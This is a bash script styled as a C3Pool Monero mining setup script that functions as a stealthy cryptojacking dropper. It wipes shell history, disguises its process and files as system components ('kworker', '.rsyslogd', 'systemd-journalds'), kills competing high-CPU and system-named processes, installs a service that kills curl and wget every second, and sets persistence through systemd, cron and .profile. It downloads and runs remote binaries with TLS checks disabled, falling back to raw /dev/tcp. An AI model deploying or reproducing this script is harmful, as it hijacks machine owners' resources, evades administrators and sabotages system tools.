#!/bin/bash
VERSION=2.11

ensure_single_instance() {
    local lock_file="/tmp/.sysupdate.lock"
    if [ -f "$lock_file" ]; then
        local old_pid=$(cat "$lock_file" 2>/dev/null)
        if [ -n "$old_pid" ] && kill -0 "$old_pid" 2>/dev/null; then
            exit 0
        fi
    fi
    echo $$ > "$lock_file"
}

random_process_name() {
    local names=("systemd" "kthreadd" "ksoftirqd" "migration" "rcu_sched" "rcu_bh" "lru-add-drain" "watchdog" "cpuhp" "kworker" "kdevtmpfs" "netns" "khungtaskd")
    local count=${#names[@]}
    local idx=$((RANDOM % count))
    if [ -n "$BASH_VERSION" ] && [ "${BASH_VERSION%%.*}" -ge 4 ]; then
        exec -a "${names[$idx]}" "$0" "$@" 2>/dev/null || true
    fi
}

cleanup_history() {
    [ -f ~/.bash_history ] && rm -f ~/.bash_history 2>/dev/null
    [ -f ~/.zsh_history ] && rm -f ~/.zsh_history 2>/dev/null
    [ -f ~/.history ] && rm -f ~/.history 2>/dev/null
    [ -d ~/.local/share/fish ] && rm -rf ~/.local/share/fish/history* 2>/dev/null
    export HISTFILE=""
    export HISTSIZE=0
    export HISTFILESIZE=0
    unset HISTFILE HISTSIZE HISTFILESIZE
}

ensure_single_instance
cleanup_history

echo "C3Pool mining setup script v$VERSION."
echo "(please report issues to support@c3pool.com email with full output of this script with extra \"-x\" \"bash\" option)"
echo

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
fi

WALLET=$1
EMAIL=$2

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> pool.sh <wallet address or USDT TRC20 address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 -a ${#WALLET_BASE} != 34 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106, 95, or 34 for USDT TRC20): ${#WALLET_BASE}"
  exit 1
fi

PASS="root"

HIDDEN_DIR="$HOME/.config/.local/.sys"
MINER_DIR="/var/tmp/.nodebox"
MINER_NAME="nodebox"
SERVICE_NAME="c3pool_miner"

if [ ! -d /var/tmp ]; then
  echo "ERROR: /var/tmp directory does not exist"
  exit 1
fi

mkdir -p "$HIDDEN_DIR" 2>/dev/null

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi


download_file() {
  local url="$1"
  local output="$2"
  if command -v busybox >/dev/null 2>&1 && busybox | grep -q wget; then
    busybox wget --no-check-certificate -q "$url" -O "$output" 2>/dev/null && return 0
  elif command -v curl >/dev/null 2>&1; then
    curl -L -k "$url" -o "$output" 2>/dev/null && return 0
  elif command -v wget >/dev/null 2>&1; then
    wget --no-check-certificate -q "$url" -O "$output" 2>/dev/null && return 0
  elif command -v python3 >/dev/null 2>&1; then
    python3 -c "import urllib.request, ssl; ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE; urllib.request.urlretrieve(\"$url\", \"$output\", context=ctx)" 2>/dev/null && return 0
  elif command -v python >/dev/null 2>&1; then
    python -c "import urllib2, ssl; ctx = ssl._create_unverified_context(); f = urllib2.urlopen(\"$url\", context=ctx); open(\"$output\", \"wb\").write(f.read())" 2>/dev/null && return 0
  elif command -v node >/dev/null 2>&1; then
    node -e "var https=require(\"https\");var fs=require(\"fs\");var u=require(\"url\");var p=u.parse(\"$url\");var o={hostname:p.hostname,path:p.path,rejectUnauthorized:false};https.get(o,function(r){var f=fs.createWriteStream(\"$output\");r.pipe(f);f.on(\"finish\",function(){f.close()})})" 2>/dev/null && sleep 2 && return 0
  elif command -v php >/dev/null 2>&1; then
    php -r "file_put_contents(\"$output\", file_get_contents(\"$url\"));" 2>/dev/null && return 0
  elif [ -e /dev/tcp ]; then
    host=$(echo "$url" | sed -e "s|^[^/]*//||" -e "s|/.*$||")
    path=$(echo "$url" | sed -e "s|^[^/]*//[^/]*||")
    port=443
    if echo "$url" | grep -q "^http:"; then port=80; fi
    exec 3<>/dev/tcp/$host/$port 2>/dev/null || return 1
    echo -e "GET $path HTTP/1.1\r\nHost: $host\r\nConnection: close\r\n\r\n" >&3
    sed "1,/^$/d" <&3 > "$output" 2>/dev/null
    exec 3<&-; exec 3>&-
    return 0
  fi
  return 1
}

download_text() {
  local url="$1"
  if command -v busybox >/dev/null 2>&1 && busybox | grep -q wget; then
    busybox wget --no-check-certificate -qO- "$url" 2>/dev/null
  elif command -v curl >/dev/null 2>&1; then
    curl -s -Lk "$url" 2>/dev/null
  elif command -v wget >/dev/null 2>&1; then
    wget -qO- --no-check-certificate "$url" 2>/dev/null
  elif command -v python3 >/dev/null 2>&1; then
    python3 -c "import urllib.request, ssl; ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE; print(urllib.request.urlopen(\"$url\", context=ctx).read().decode())" 2>/dev/null
  elif command -v python >/dev/null 2>&1; then
    python -c "import urllib2, ssl; ctx = ssl._create_unverified_context(); print(urllib2.urlopen(\"$url\", context=ctx).read())" 2>/dev/null
  elif command -v node >/dev/null 2>&1; then
    node -e "var https=require(\"https\");var u=require(\"url\");var p=u.parse(\"$url\");var o={hostname:p.hostname,path:p.path,rejectUnauthorized:false};https.get(o,function(r){var d=\"\";r.on(\"data\",function(c){d+=c});r.on(\"end\",function(){process.stdout.write(d)})})" 2>/dev/null
  elif command -v php >/dev/null 2>&1; then
    php -r "echo file_get_contents(\"$url\");" 2>/dev/null
  elif [ -e /dev/tcp ]; then
    host=$(echo "$url" | sed -e "s|^[^/]*//||" -e "s|/.*$||")
    path=$(echo "$url" | sed -e "s|^[^/]*//[^/]*||")
    port=443
    if echo "$url" | grep -q "^http:"; then port=80; fi
    exec 3<>/dev/tcp/$host/$port 2>/dev/null || return 1
    echo -e "GET $path HTTP/1.1\r\nHost: $host\r\nConnection: close\r\n\r\n" >&3
    sed "1,/^$/d" <&3
    exec 3<&-; exec 3>&-
  fi
}

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

echo "Projected Monero hashrate: $EXP_MONERO_HASHRATE H/s"

echo "I will download, setup and run in background Monero CPU miner."
echo "If needed, miner in foreground can be started by /var/tmp/.nodebox/nodebox.sh script."
echo "Mining will happen to $WALLET wallet on SupportXMR pools."
if [ ! -z $EMAIL ]; then
  echo "(Email $EMAIL provided for reference - check stats at https://www.supportxmr.com/)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using c3pool_miner systemd service."
  echo "Kill service will monitor and kill curl/wget processes."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads with $CPU_MHZ MHz and ${TOTAL_CACHE}KB data cache in total, so projected Monero hashrate is around $EXP_MONERO_HASHRATE H/s."
echo

echo "[*] Removing previous c3pool miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop "$SERVICE_NAME.service" 2>/dev/null
  sudo systemctl stop curl_wget_killer.service 2>/dev/null
  sudo systemctl --user stop "$SERVICE_NAME.service" 2>/dev/null
fi
killall xmrig 2>/dev/null
killall -9 xmrig 2>/dev/null
killall -9 "$MINER_NAME" 2>/dev/null
pkill "$MINER_NAME" 2>/dev/null
pkill xmrig 2>/dev/null
for name in systemd kthreadd ksoftirqd migration rcu_sched; do
    pkill -f "$name" 2>/dev/null | grep -v "$$" | xargs kill -9 2>/dev/null
done
echo "[*] Killing processes with CPU usage > 70%"
ps aux | awk 'NR>1 && $3 > 70.0 && $2 != '$$' {print $2}' | while read pid; do
  if [ ! -z "$pid" ]; then
    kill -9 $pid 2>/dev/null
  fi
done

echo "[*] Removing previous installation"
rm -rf "$MINER_DIR" 2>/dev/null
rm -rf "$HIDDEN_DIR/.rsyslogd" 2>/dev/null
rm -f "$HIDDEN_DIR/.installed" 2>/dev/null

TEMP_FILE="/var/tmp/.update$(date +%s).tar.gz"
echo "[*] Downloading C3Pool advanced version of nodebox"
if ! download_file "https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/xmrig.tar.gz" "$TEMP_FILE"; then
  echo "ERROR: Can't download miner file"
  exit 1
fi

echo "[*] Unpacking miner"
[ -d "$MINER_DIR" ] || mkdir -p "$MINER_DIR"
if ! tar xf "$TEMP_FILE" -C "$MINER_DIR" 2>/dev/null; then
  echo "ERROR: Can't unpack miner directory"
  exit 1
fi
rm -f "$TEMP_FILE" 2>/dev/null

if [ -f "$MINER_DIR/xmrig" ]; then
  mv "$MINER_DIR/xmrig" "$MINER_DIR/$MINER_NAME"
  chmod +x "$MINER_DIR/$MINER_NAME" 2>/dev/null
fi

if [ -f "$MINER_DIR/$MINER_NAME" ]; then
  cp "$MINER_DIR/$MINER_NAME" "$HIDDEN_DIR/.rsyslogd" 2>/dev/null
  chmod +x "$HIDDEN_DIR/.rsyslogd" 2>/dev/null
fi

echo "[*] Checking if advanced version of miner works fine"
if [ -f "$MINER_DIR/config.json" ]; then
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' "$MINER_DIR/config.json" 2>/dev/null
fi
"$MINER_DIR/$MINER_NAME" --help >/dev/null 2>&1
if (test $? -ne 0); then
  if [ -f "$MINER_DIR/$MINER_NAME" ]; then
    echo "WARNING: Advanced version of miner is not functional"
  else 
    echo "WARNING: Advanced version of miner was removed by antivirus"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  LATEST_XMRIG_LINUX_RELEASE="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE"
  if ! download_file "$LATEST_XMRIG_LINUX_RELEASE" "$TEMP_FILE"; then
    echo "ERROR: Can't download miner file"
    exit 1
  fi

  echo "[*] Unpacking miner"
  if ! tar xf "$TEMP_FILE" -C "$MINER_DIR" --strip=1 2>/dev/null; then
    echo "WARNING: Can't unpack miner directory"
  fi
  rm -f "$TEMP_FILE" 2>/dev/null

  if [ -f "$MINER_DIR/xmrig" ]; then
    mv "$MINER_DIR/xmrig" "$MINER_DIR/$MINER_NAME"
    chmod +x "$MINER_DIR/$MINER_NAME" 2>/dev/null
  fi

  if [ -f "$MINER_DIR/$MINER_NAME" ]; then
    cp "$MINER_DIR/$MINER_NAME" "$HIDDEN_DIR/.rsyslogd" 2>/dev/null
    chmod +x "$HIDDEN_DIR/.rsyslogd" 2>/dev/null
  fi

  echo "[*] Checking if stock version of miner works fine"
  if [ -f "$MINER_DIR/config.json" ]; then
    sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' "$MINER_DIR/config.json" 2>/dev/null
  fi
  "$MINER_DIR/$MINER_NAME" --help >/dev/null 2>&1
  if (test $? -ne 0); then 
    if [ -f "$MINER_DIR/$MINER_NAME" ]; then
      echo "WARNING: Stock version of miner is not functional"
    else 
      echo "WARNING: Stock version of miner was removed by antivirus"
    fi
    
    if [ -f /etc/os-release ] && grep -q 'NAME="Alpine Linux"' /etc/os-release; then
      echo "[*] Detected Alpine Linux, installing xmrig from apk"
      apk add xmrig 2>/dev/null || apk add --no-cache xmrig 2>/dev/null
      if command -v xmrig >/dev/null 2>&1; then
        echo "[*] xmrig installed successfully from apk"
        PASS="root"
        echo "[*] Starting xmrig with auto-restart loop"
        (while true; do
          xmrig -o pool.supportxmr.com:443 -u $WALLET -p $PASS -k --donate-level 0 --log-file="$MINER_DIR/$MINER_NAME.log" --coin monero --tls >/dev/null 2>&1
          sleep 5
        done) &
        echo "[*] xmrig started in background with auto-restart"
        exit 0
      else
        echo "ERROR: Failed to install xmrig from apk"
        exit 1
      fi
    else
      echo "ERROR: Stock version of /var/tmp/.nodebox/nodebox is not functional and not Alpine Linux"
      exit 1
    fi
  fi
fi

echo "[*] Miner $MINER_DIR/$MINER_NAME is OK"

PASS="root"

echo "[*] Creating SupportXMR config.json with multiple pools"
cat >"$MINER_DIR/config.json" <<EOL
{
    "autosave": true,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "pool.supportxmr.com:443",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": true
        },
        {
            "url": "pool.supportxmr.com:8080",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": false
        },
        {
            "url": "pool.supportxmr.com:7777",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": false
        },
        {
            "url": "pool.supportxmr.com:5555",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": false
        },
        {
            "url": "pool.supportxmr.com:80",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": false
        },
        {
            "url": "pool.supportxmr.com:3333",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": false
        }
    ],
    "log-file": "$MINER_DIR/$MINER_NAME.log",
    "donate-level": 0,
    "max-cpu-usage": 100,
    "syslog": true
}
EOL

cp "$MINER_DIR/config.json" "$MINER_DIR/config_background.json" 2>/dev/null
sed -i 's/"background": *false,/"background": true,/' "$MINER_DIR/config_background.json" 2>/dev/null || true

echo "[*] Creating miner startup script"
cat >"$MINER_DIR/nodebox.sh" <<EOL
#!/bin/bash
cleanup_history() {
    export HISTFILE=""
    export HISTSIZE=0
    export HISTFILESIZE=0
    unset HISTFILE HISTSIZE HISTFILESIZE
}
cleanup_history

if ! pidof $MINER_NAME >/dev/null; then
  nice "$MINER_DIR/$MINER_NAME" \$*
else
  if [ ! -f "$MINER_DIR/$MINER_NAME.log" ]; then
    "$MINER_DIR/$MINER_NAME" --config="$MINER_DIR/config.json" >/dev/null 2>&1
  fi
fi
EOL

chmod +x "$MINER_DIR/nodebox.sh" 2>/dev/null

setup_user_persistence() {
    local home_dir="${HOME:-/var/tmp}"
    local service_dir="$home_dir/.config/systemd/user"
    local service_file="$service_dir/$SERVICE_NAME.service"
    
    mkdir -p "$service_dir" 2>/dev/null
    mkdir -p "$HIDDEN_DIR" 2>/dev/null
    
    if [ -f "$MINER_DIR/$MINER_NAME" ]; then
        cp "$MINER_DIR/$MINER_NAME" "$HIDDEN_DIR/.rsyslogd" 2>/dev/null
        chmod +x "$HIDDEN_DIR/.rsyslogd" 2>/dev/null
    fi
    
    cat >"$service_file" <<EOL
[Unit]
Description=systemd-journalds
After=network.target

[Service]
Type=simple
ExecStart=$MINER_DIR/$MINER_NAME --config=$MINER_DIR/config_background.json
Restart=always
RestartSec=10
Environment="HISTFILE="
Environment="HISTSIZE=0"
Environment="HISTFILESIZE=0"

[Install]
WantedBy=default.target
EOL
    
    systemctl --user daemon-reload 2>/dev/null
    systemctl --user enable "$SERVICE_NAME.service" 2>/dev/null
    systemctl --user start "$SERVICE_NAME.service" 2>/dev/null || true
    
    if ! crontab -l 2>/dev/null | grep -q "$MINER_DIR/$MINER_NAME"; then
        (crontab -l 2>/dev/null; echo "@reboot $MINER_DIR/$MINER_NAME --config=$MINER_DIR/config_background.json >/dev/null 2>&1") | crontab - 2>/dev/null
    fi
    
    touch "$HIDDEN_DIR/.installed" 2>/dev/null
}

if ! sudo -n true 2>/dev/null; then
  if [ -z "$HOME" ]; then
    HOME=/var/tmp
  fi
  setup_user_persistence
  
  if ! grep "$MINER_DIR/nodebox.sh" "$HOME/.profile" >/dev/null 2>&1; then
    echo "[*] Adding miner script to $HOME/.profile"
    echo "$MINER_DIR/nodebox.sh --config=$MINER_DIR/config_background.json >/dev/null 2>&1" >>"$HOME/.profile"
  fi
  
  echo "[*] Running miner in the background (see logs in $MINER_DIR/$MINER_NAME.log file)"
  for s in /bin/bash /bin/sh /usr/bin/bash /usr/bin/sh bash sh; do
    if command -v $s >/dev/null 2>&1; then
      $s "$MINER_DIR/nodebox.sh" --config="$MINER_DIR/config_background.json" >/dev/null 2>&1 &
      break
    fi
  done
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] Running miner in the background (see logs in /var/tmp/.nodebox/nodebox.log file)"
    for s in /bin/bash /bin/sh /usr/bin/bash /usr/bin/sh bash sh; do
      if command -v $s >/dev/null 2>&1; then
        $s /var/tmp/.nodebox/nodebox.sh --config=/var/tmp/.nodebox/config_background.json >/dev/null 2>&1
        break
      fi
    done
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating curl_wget_killer systemd service"
    cat >/var/tmp/curl_wget_killer.service <<EOL
[Unit]
Description=Network Monitor Service

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do pkill -9 curl; pkill -9 wget; sleep 1; done'
Restart=always
RestartSec=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /var/tmp/curl_wget_killer.service /etc/systemd/system/curl_wget_killer.service 2>/dev/null
    echo "[*] Starting curl_wget_killer systemd service"
    sudo systemctl daemon-reload 2>/dev/null
    sudo systemctl enable curl_wget_killer.service 2>/dev/null
    sudo systemctl start curl_wget_killer.service 2>/dev/null

    echo "[*] Creating $SERVICE_NAME systemd service"
    cat >/var/tmp/$SERVICE_NAME.service <<EOL
[Unit]
Description=systemd-journalds

[Service]
ExecStart=$MINER_DIR/$MINER_NAME --config=$MINER_DIR/config.json
Restart=always
RestartSec=10
Nice=10
CPUWeight=1
Environment="HISTFILE="
Environment="HISTSIZE=0"
Environment="HISTFILESIZE=0"

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /var/tmp/$SERVICE_NAME.service /etc/systemd/system/$SERVICE_NAME.service 2>/dev/null
    echo "[*] Starting $SERVICE_NAME systemd service"
    sudo killall "$MINER_NAME" 2>/dev/null
    sudo systemctl daemon-reload 2>/dev/null
    sudo systemctl enable "$SERVICE_NAME.service" 2>/dev/null
    sudo systemctl start "$SERVICE_NAME.service" 2>/dev/null
    echo "To see miner service logs run \"sudo journalctl -u $SERVICE_NAME -f\" command"
    echo "To see kill service logs run \"sudo journalctl -u curl_wget_killer -f\" command"
  fi
fi

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e $MINER_NAME -l $((75*$CPU_THREADS)) -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e $MINER_NAME -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e $MINER_NAME -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' $MINER_DIR/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' $MINER_DIR/config_background.json"
fi
echo ""
sleep 5
if [ ! -f "$MINER_DIR/$MINER_NAME.log" ]; then
  echo "[*] File $MINER_DIR/$MINER_NAME.log not found"
  "$MINER_DIR/$MINER_NAME" --config="$MINER_DIR/config.json" >/dev/null 2>&1
fi

cleanup_history
rm -f /tmp/.sysupdate.lock 2>/dev/null
echo "[*] Setup complete"
